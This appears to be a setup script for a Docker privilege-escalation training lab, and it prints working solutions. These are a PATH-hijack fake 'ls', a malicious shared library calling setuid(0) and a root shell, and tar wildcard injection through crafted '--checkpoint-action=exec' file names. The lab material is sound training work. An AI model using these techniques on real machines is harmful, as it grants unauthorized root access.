#!/bin/bash
# Privilege Escalation Challenge: Linux Advanced
# Sets up a Docker container with advanced privilege escalation vectors:
#   1. PATH hijacking via SUID binary (calls system("ls"))
#   2. Shared library hijacking (SUID binary loads from user-writable rpath)
#   3. Wildcard injection in cron tar command
#
# Usage: bash setup.sh
# Connect: docker exec -it privesc-advanced su - user

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CONTAINER_NAME="privesc-advanced"
IMAGE_NAME="privesc-advanced-challenge"

echo "================================================"
echo "  Privilege Escalation: Advanced Setup"
echo "================================================"
echo ""

# Check Docker
if ! command -v docker &> /dev/null; then
    echo "[!] Docker is not installed or not in PATH."
    exit 1
fi

# Clean up existing
if docker ps -a --format '{{.Names}}' | grep -q "^${CONTAINER_NAME}$"; then
    echo "[*] Removing existing container..."
    docker rm -f "${CONTAINER_NAME}" > /dev/null 2>&1
fi

# Build
echo "[*] Building Docker image..."
docker build -t "${IMAGE_NAME}" "${SCRIPT_DIR}"

# Run
echo "[*] Starting container..."
docker run -d \
    --name "${CONTAINER_NAME}" \
    -p 2223:22 \
    "${IMAGE_NAME}"

echo ""
echo "[+] Container '${CONTAINER_NAME}' is running!"
echo ""
echo "Connect:"
echo "  docker exec -it ${CONTAINER_NAME} su - user"
echo "  # OR: ssh user@localhost -p 2223  (password: user)"
echo ""
echo "=========================================="
echo "  Exploitation Paths:"
echo "=========================================="
echo ""
echo "1. PATH Hijacking (SUID vuln_list):"
echo "   echo '#!/bin/bash' > /tmp/ls"
echo "   echo '/bin/bash -p' >> /tmp/ls"
echo "   chmod +x /tmp/ls"
echo "   export PATH=/tmp:\$PATH"
echo "   /usr/local/bin/vuln_list"
echo ""
echo "2. Shared Library Hijacking (SUID svc_manager):"
echo "   cat > /home/user/lib/libhelper.so.c << 'EOF'"
echo "   #include <stdio.h>"
echo "   #include <stdlib.h>"
echo "   void do_work() {"
echo "       setuid(0); setgid(0);"
echo "       system(\"/bin/bash -p\");"
echo "   }"
echo "   EOF"
echo "   gcc -shared -fPIC -o /home/user/lib/libhelper.so /home/user/lib/libhelper.so.c"
echo "   /usr/local/bin/svc_manager"
echo ""
echo "3. Tar Wildcard Injection (cron job):"
echo "   cd /home/user/backups"
echo "   echo '/bin/bash -p > /tmp/rootshell && chmod u+s /tmp/rootshell' > shell.sh"
echo "   chmod +x shell.sh"
echo "   touch './--checkpoint=1'"
echo "   touch './--checkpoint-action=exec=sh shell.sh'"
echo "   echo 'dummy' > data.txt"
echo "   # Wait 1 minute for cron to fire"
echo "   /tmp/rootshell"
echo ""
echo "Flag location: /root/flag.txt"
echo "To stop: docker rm -f ${CONTAINER_NAME}"
